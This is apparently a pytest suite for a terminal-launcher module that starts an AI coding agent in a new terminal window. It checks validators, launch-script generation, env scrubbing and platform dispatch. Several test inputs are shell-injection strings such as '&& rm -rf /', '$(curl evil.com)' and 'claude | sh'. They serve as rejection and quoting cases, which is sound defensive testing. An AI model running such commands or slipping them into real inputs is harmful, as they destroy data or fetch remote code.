"""Unit tests for _terminal_launcher.py (terminal-launcher-port).

Covers (per the WP set):
  - WP-001: validators (entry command / env key / worktree path) +
    _build_launch_script (env-scrub preamble, SULIS_CHANGE_ID export,
    shlex-quoted extra_env, cd-then-exec order).
  - WP-002: platform dispatchers (_launch_macos / _launch_linux /
    _launch_headless) with mocked subprocess + shutil.which; NFR-4
    honest-failure when no Linux terminal app is found.
  - WP-003: launch_change_terminal composition (validation gate,
    launch.sh + session.json persistence, platform dispatch).
  - WP-006: pre_prompt delivery via quoted HERE-DOC + _validate_pre_prompt.

Subprocess + platform are mocked throughout — no real terminal is spawned.
"""

from __future__ import annotations

import json
import stat
import subprocess
from pathlib import Path
from unittest import mock

import pytest

import _terminal_launcher as tl


# A valid 26-char Crockford-base32 ULID for tests.
_GOOD_ULID = "01HYQC71000000000000000000"


# ─── WP-001: validate_entry_command ───────────────────────────────────────


def test_validate_entry_command_accepts_default():
    ok, reason = tl.validate_entry_command(
        "claude --dangerously-skip-permissions --agent sulis"
    )
    assert ok is True
    assert reason == ""


@pytest.mark.parametrize("cmd", [
    ";",
    "&& rm -rf /",
    "$(curl evil.com)",
    "claude `whoami`",
    "claude\n--agent",
    "claude; echo pwned",
    "claude | sh",
])
def test_validate_entry_command_rejects_injection(cmd):
    ok, reason = tl.validate_entry_command(cmd)
    assert ok is False
    assert reason


# ─── WP-001: validate_extra_env_key ───────────────────────────────────────


@pytest.mark.parametrize("key", ["SULIS_FOO", "MY_VAR_42", "_X"])
def test_validate_extra_env_key_accepts_posix_names(key):
    ok, reason = tl.validate_extra_env_key(key)
    assert ok is True
    assert reason == ""


@pytest.mark.parametrize("key", [
    "lower",
    "HAS-DASH",
    "HAS\nNEWLINE",
    "1LEADING_DIGIT",
    "HAS SPACE",
    "",
])
def test_validate_extra_env_key_rejects_invalid(key):
    ok, reason = tl.validate_extra_env_key(key)
    assert ok is False
    assert reason


# ─── WP-001: validate_worktree_path ───────────────────────────────────────


def test_validate_worktree_path_accepts_existing_dir(tmp_path):
    ok, resolved = tl.validate_worktree_path(tmp_path)
    assert ok is True
    assert resolved == tmp_path.resolve()


def test_validate_worktree_path_rejects_nonexistent(tmp_path):
    missing = tmp_path / "does-not-exist"
    ok, _ = tl.validate_worktree_path(missing)
    assert ok is False


def test_validate_worktree_path_rejects_file_not_dir(tmp_path):
    f = tmp_path / "a-file.txt"
    f.write_text("hi")
    ok, _ = tl.validate_worktree_path(f)
    assert ok is False


# ─── WP-001: _build_launch_script ─────────────────────────────────────────


def test_build_launch_script_includes_env_scrub(tmp_path):
    script = tl._build_launch_script(_GOOD_ULID, tmp_path)
    # compgen-based scrub that carries over the whitelist...
    assert "compgen -v | grep -Ev" in script
    assert "PATH|HOME|USER|TERM|LANG|LC_.*" in script
    # ...and is hardened against the `set -e` readonly-var abort (the dogfood
    # bug): readonly bash vars excluded + stderr silenced + non-fatal.
    assert "EUID" in script
    assert "SHELLOPTS" in script
    assert "2>/dev/null || true" in script


def test_build_launch_script_exports_sulis_change_id(tmp_path):
    script = tl._build_launch_script(_GOOD_ULID, tmp_path)
    assert f'export SULIS_CHANGE_ID="{_GOOD_ULID}"' in script


def test_build_launch_script_inserts_extra_env_shlex_quoted(tmp_path):
    script = tl._build_launch_script(
        _GOOD_ULID, tmp_path, extra_env={"FOO": "bar; rm -rf /"},
    )
    assert "export FOO='bar; rm -rf /'" in script


def test_build_launch_script_cd_then_exec_order(tmp_path):
    script = tl._build_launch_script(_GOOD_ULID, tmp_path)
    cd_idx = script.index('cd "')
    exec_idx = script.index("exec ")
    assert cd_idx < exec_idx


# ─── Regression: execute the generated script under bash ───────────────────
# The mocked content-assertion tests above never *ran* the script, so the
# `set -euo pipefail` abort on bash readonly vars (EUID/UID/PPID/SHELLOPTS/...)
# in the env-scrub line was invisible — a real spawn dropped to a bare shell
# and `claude` never started. This test actually executes the generated
# script under bash with the entry_command swapped for a harmless marker,
# proving the env-scrub does NOT abort and the final exec line is reached.


def test_generated_script_runs_to_exec_under_bash(tmp_path):
    """The generated launch script must run to its exec line under bash.

    Regression guard for the env-scrub `set -e` abort: bash readonly vars
    (EUID, UID, PPID, SHELLOPTS, BASH_VERSINFO, ...) are present in this very
    process, so a non-resilient `unset` of them aborts the script before the
    exec line. We swap entry_command for a harmless lowercase marker the
    validator accepts (`printf reached-exec`) and assert the marker is printed
    AND the script exits 0.
    """
    script = tl._build_launch_script(
        _GOOD_ULID, tmp_path, entry_command="printf reached-exec",
    )
    script_path = tmp_path / "launch.sh"
    script_path.write_text(script)
    result = subprocess.run(
        ["bash", str(script_path)],
        capture_output=True,
        text=True,
        cwd=str(tmp_path),
    )
    assert result.returncode == 0, (
        f"script aborted (exit {result.returncode}); "
        f"stderr={result.stderr!r}"
    )
    assert "reached-exec" in result.stdout, (
        f"exec line not reached; stdout={result.stdout!r} "
        f"stderr={result.stderr!r}"
    )


def test_generated_script_scrub_does_not_spam_readonly_errors(tmp_path):
    """The env-scrub must not print `cannot unset ... readonly variable` spam.

    Even with `|| true` guarding the exit code, an unguarded stderr stream
    floods the founder's terminal with one error line per bash readonly var.
    Routing stderr to /dev/null keeps the spawned window clean.
    """
    script = tl._build_launch_script(
        _GOOD_ULID, tmp_path, entry_command="printf reached-exec",
    )
    script_path = tmp_path / "launch.sh"
    script_path.write_text(script)
    result = subprocess.run(
        ["bash", str(script_path)],
        capture_output=True,
        text=True,
        cwd=str(tmp_path),
    )
    assert "readonly variable" not in result.stderr, (
        f"env-scrub spammed readonly-var errors: stderr={result.stderr!r}"
    )
    assert "cannot unset" not in result.stderr


# ─── WP-002: _launch_macos ────────────────────────────────────────────────


def _fake_osascript(stdout: str):
    """Build a fake subprocess.run CompletedProcess-like object."""
    fake = mock.Mock()
    fake.stdout = stdout
    fake.stderr = ""
    fake.returncode = 0
    return fake


def test_launch_macos_invokes_osascript(tmp_path):
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    with mock.patch.object(tl.subprocess, "run",
                           return_value=_fake_osascript("/dev/ttys003\n")) as p:
        tl._launch_macos(script_path, _GOOD_ULID, visible=True)
    args = p.call_args[0][0]
    assert "osascript" in args
    joined = " ".join(args)
    assert "tell" in joined and "Terminal" in joined and "do script" in joined


def test_launch_macos_activates_terminal_to_foreground(tmp_path):
    """Bug 3: the AppleScript must `activate` Terminal so the window comes to
    the foreground rather than opening behind the founder's current app."""
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    with mock.patch.object(tl.subprocess, "run",
                           return_value=_fake_osascript("/dev/ttys003\n")) as p:
        tl._launch_macos(script_path, _GOOD_ULID, visible=True)
    joined = " ".join(p.call_args[0][0])
    assert "activate" in joined


def test_launch_macos_captures_tty_as_session_handle(tmp_path):
    """Bug 2: when the tab's tty is read back, record it with
    pid_kind="session" (a real liveness handle) instead of a dead pid."""
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    with mock.patch.object(tl.subprocess, "run",
                           return_value=_fake_osascript("/dev/ttys007\n")):
        result = tl._launch_macos(script_path, _GOOD_ULID, visible=True)
    assert result["status"] == "spawned"
    assert result["terminal_app_used"] == "Terminal.app"
    assert result["tty"] == "/dev/ttys007"
    assert result["pid_kind"] == "session"
    assert result["error"] is None


def test_launch_macos_degrades_honestly_when_no_tty(tmp_path):
    """Bug 2 honest-degrade: if the tty can't be parsed, flag
    pid_kind="launcher" (don't record a misleading handle)."""
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    with mock.patch.object(tl.subprocess, "run",
                           return_value=_fake_osascript("garbage not-a-tty\n")):
        result = tl._launch_macos(script_path, _GOOD_ULID, visible=True)
    assert result["status"] == "spawned"
    assert result["tty"] is None
    assert result["pid_kind"] == "launcher"


def test_launch_macos_returns_spawned_dict(tmp_path):
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    with mock.patch.object(tl.subprocess, "run",
                           return_value=_fake_osascript("/dev/ttys003\n")):
        result = tl._launch_macos(script_path, _GOOD_ULID, visible=True)
    assert result["status"] == "spawned"
    assert result["terminal_app_used"] == "Terminal.app"
    assert result["error"] is None


# ─── WP-002: _launch_linux ────────────────────────────────────────────────


def test_launch_linux_tries_gnome_first(tmp_path):
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    fake_proc = mock.Mock()
    fake_proc.pid = 99
    which_map = {"gnome-terminal": "/usr/bin/gnome-terminal"}
    with mock.patch.object(tl.shutil, "which", side_effect=which_map.get), \
            mock.patch.object(tl.subprocess, "Popen", return_value=fake_proc) as p:
        result = tl._launch_linux(script_path, _GOOD_ULID, visible=True)
    assert result["status"] == "spawned"
    assert result["terminal_app_used"] == "gnome-terminal"
    assert "gnome-terminal" in p.call_args[0][0]


def test_launch_linux_falls_back_to_konsole(tmp_path):
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    fake_proc = mock.Mock()
    fake_proc.pid = 99
    which_map = {"konsole": "/usr/bin/konsole"}
    with mock.patch.object(tl.shutil, "which", side_effect=which_map.get), \
            mock.patch.object(tl.subprocess, "Popen", return_value=fake_proc):
        result = tl._launch_linux(script_path, _GOOD_ULID, visible=True)
    assert result["status"] == "spawned"
    assert result["terminal_app_used"] == "konsole"


def test_launch_linux_falls_back_to_xterm(tmp_path):
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    fake_proc = mock.Mock()
    fake_proc.pid = 99
    which_map = {"xterm": "/usr/bin/xterm"}
    with mock.patch.object(tl.shutil, "which", side_effect=which_map.get), \
            mock.patch.object(tl.subprocess, "Popen", return_value=fake_proc):
        result = tl._launch_linux(script_path, _GOOD_ULID, visible=True)
    assert result["status"] == "spawned"
    assert result["terminal_app_used"] == "xterm"


def test_launch_linux_fails_when_no_terminal_app(tmp_path):
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    with mock.patch.object(tl.shutil, "which", return_value=None), \
            mock.patch.object(tl.subprocess, "Popen") as p:
        result = tl._launch_linux(script_path, _GOOD_ULID, visible=True)
    assert result["status"] == "failed"
    assert result["error"]
    assert "gnome-terminal" in result["error"]
    assert p.call_count == 0  # NFR-4: no silent fallback subprocess


# ─── WP-002: _launch_headless ─────────────────────────────────────────────


def test_launch_headless_uses_background_subprocess(tmp_path):
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    fake_proc = mock.Mock()
    fake_proc.pid = 7
    with mock.patch.object(tl.subprocess, "Popen", return_value=fake_proc) as p:
        tl._launch_headless(script_path, _GOOD_ULID)
    kwargs = p.call_args.kwargs
    assert kwargs.get("stdout") == tl.subprocess.DEVNULL


def test_launch_headless_returns_spawned_dict(tmp_path):
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    fake_proc = mock.Mock()
    fake_proc.pid = 7
    with mock.patch.object(tl.subprocess, "Popen", return_value=fake_proc):
        result = tl._launch_headless(script_path, _GOOD_ULID)
    assert result["status"] == "spawned"
    assert result["terminal_app_used"] == "headless"


# ─── WP-003: launch_change_terminal ───────────────────────────────────────


def _spawned_dict(script_path: Path) -> dict:
    return {
        "status": "spawned",
        "pid": None,
        "pid_kind": "session",
        "tty": "/dev/ttys009",
        "terminal_app_used": "Terminal.app",
        "script_path": str(script_path),
        "error": None,
    }


def test_launch_change_terminal_validates_change_id(tmp_path):
    with mock.patch.object(tl.subprocess, "Popen") as p:
        with pytest.raises(ValueError):
            tl.launch_change_terminal("not-a-ulid", tmp_path)
    assert p.call_count == 0


def test_launch_change_terminal_validates_worktree_path(tmp_path):
    missing = tmp_path / "nope"
    with pytest.raises(ValueError):
        tl.launch_change_terminal(_GOOD_ULID, missing)


def test_launch_change_terminal_writes_executable_launch_script(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl, "_launch_macos",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)):
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    script_path = Path(result["script_path"])
    assert script_path.exists()
    mode = script_path.stat().st_mode
    assert mode & stat.S_IXUSR


def test_launch_change_terminal_writes_session_json_on_spawn(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl, "_launch_macos",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)):
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    sj = Path(result["session_json_path"])
    assert sj.exists()
    payload = json.loads(sj.read_text())
    assert payload["change_id"] == _GOOD_ULID
    assert payload["terminal_app_used"] == "Terminal.app"
    assert "spawned_at" in payload
    # Bug 2: session.json records pid_kind + tty so focus's liveness check
    # has a real handle and never trusts a known-dead launcher pid.
    assert payload["pid_kind"] == "session"
    assert payload["tty"] == "/dev/ttys009"


def test_launch_change_terminal_does_not_write_session_json_on_failure(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    failed = {
        "status": "failed", "pid": None, "terminal_app_used": None,
        "script_path": "", "error": "boom",
    }
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl, "_launch_macos",
                              side_effect=lambda sp, cid, vis: {**failed, "script_path": str(sp)}):
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    assert result["status"] == "failed"
    sj = Path(result["session_json_path"]) if result.get("session_json_path") else None
    if sj is not None:
        assert not sj.exists()


def test_launch_change_terminal_dispatches_to_macos_on_darwin(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl, "_launch_macos",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)) as m:
        tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    assert m.call_count == 1


def test_launch_change_terminal_dispatches_to_linux_on_linux(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Linux"), \
            mock.patch.object(tl, "_launch_linux",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)) as m:
        tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    assert m.call_count == 1


def test_launch_change_terminal_fails_on_unknown_platform_visible(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Windows"):
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path, visible=True)
    assert result["status"] == "failed"
    assert "unsupported platform" in result["error"].lower()


def test_launch_change_terminal_uses_headless_on_unknown_platform_invisible(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Windows"), \
            mock.patch.object(tl, "_launch_headless",
                              side_effect=lambda sp, cid: _spawned_dict(sp)) as m:
        tl.launch_change_terminal(_GOOD_ULID, tmp_path, visible=False)
    assert m.call_count == 1


# ─── Hardening: file-I/O guards (OSError → structured _failed) ────────────


def test_launch_change_terminal_returns_failed_when_write_text_raises(tmp_path, monkeypatch):
    """An unwritable launch.sh path must surface a structured failure, not raise."""
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl.Path, "write_text",
                              side_effect=PermissionError(13, "Permission denied")), \
            mock.patch.object(tl.subprocess, "Popen") as p:
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    assert result["status"] == "failed"
    assert result["pid"] is None
    assert result["error"]
    assert "launch.sh" in result["error"]
    assert "session_json_path" in result
    assert result["session_json_path"] == ""
    assert p.call_count == 0  # never reached the spawn


def test_launch_change_terminal_returns_failed_when_chmod_raises(tmp_path, monkeypatch):
    """A chmod failure on the launch script must degrade to a structured failure."""
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl.Path, "chmod",
                              side_effect=OSError(30, "Read-only file system")), \
            mock.patch.object(tl.subprocess, "Popen") as p:
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    assert result["status"] == "failed"
    assert result["error"]
    assert p.call_count == 0


def test_launch_change_terminal_returns_failed_when_mkdir_raises(tmp_path, monkeypatch):
    """An unwritable ~/.sulis/changes dir must surface a structured failure."""
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl.Path, "mkdir",
                              side_effect=PermissionError(13, "Permission denied")), \
            mock.patch.object(tl.subprocess, "Popen") as p:
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    assert result["status"] == "failed"
    assert result["error"]
    # The change_id should appear in the error so the founder can locate the path.
    assert _GOOD_ULID in result["error"] or ".sulis" in result["error"]
    assert p.call_count == 0


def test_launch_change_terminal_failure_error_names_the_os_error(tmp_path, monkeypatch):
    """The structured error message must include the underlying OS error text."""
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl.Path, "write_text",
                              side_effect=OSError(28, "No space left on device")):
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    assert result["status"] == "failed"
    assert "No space left on device" in result["error"]


# ─── WP-006: _validate_pre_prompt ─────────────────────────────────────────


def test_validate_pre_prompt_accepts_none():
    ok, reason = tl._validate_pre_prompt(None)
    assert ok is True
    assert reason == ""


def test_validate_pre_prompt_accepts_short_text():
    ok, reason = tl._validate_pre_prompt("You are Sulis, focused on change CH-01.")
    assert ok is True
    assert reason == ""


def test_validate_pre_prompt_rejects_text_containing_heredoc_tag():
    body = "brief ... SULIS_PROMPT_EOF ... more"
    ok, reason = tl._validate_pre_prompt(body)
    assert ok is False
    assert reason


def test_validate_pre_prompt_rejects_oversize():
    body = "x" * (tl._PRE_PROMPT_MAX_BYTES + 1)
    ok, reason = tl._validate_pre_prompt(body)
    assert ok is False
    assert reason


# ─── WP-006: _build_launch_script with pre_prompt ─────────────────────────


def test_build_launch_script_no_pre_prompt_byte_identical_to_baseline(tmp_path):
    baseline = tl._build_launch_script(_GOOD_ULID, tmp_path)
    with_none = tl._build_launch_script(_GOOD_ULID, tmp_path, pre_prompt=None)
    assert baseline == with_none


def test_build_launch_script_with_pre_prompt_uses_quoted_heredoc(tmp_path):
    script = tl._build_launch_script(
        _GOOD_ULID, tmp_path, pre_prompt="hello world",
    )
    assert "<<'SULIS_PROMPT_EOF'" in script
    # closing tag on its own line
    assert "\nSULIS_PROMPT_EOF\n" in script


def test_build_launch_script_pre_prompt_body_verbatim(tmp_path):
    body = "Brief with $HOME and `backticks` and $(curl evil.com) inside."
    script = tl._build_launch_script(_GOOD_ULID, tmp_path, pre_prompt=body)
    assert body in script


def test_build_launch_script_invokes_pre_prompt_validator(tmp_path):
    with pytest.raises(ValueError):
        tl._build_launch_script(
            _GOOD_ULID, tmp_path, pre_prompt="oops SULIS_PROMPT_EOF oops",
        )


def test_launch_change_terminal_forwards_pre_prompt(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl, "_launch_macos",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)), \
            mock.patch.object(tl, "_build_launch_script",
                              wraps=tl._build_launch_script) as b:
        tl.launch_change_terminal(_GOOD_ULID, tmp_path, pre_prompt="hello")
    assert b.call_args.kwargs.get("pre_prompt") == "hello" or "hello" in b.call_args[0]
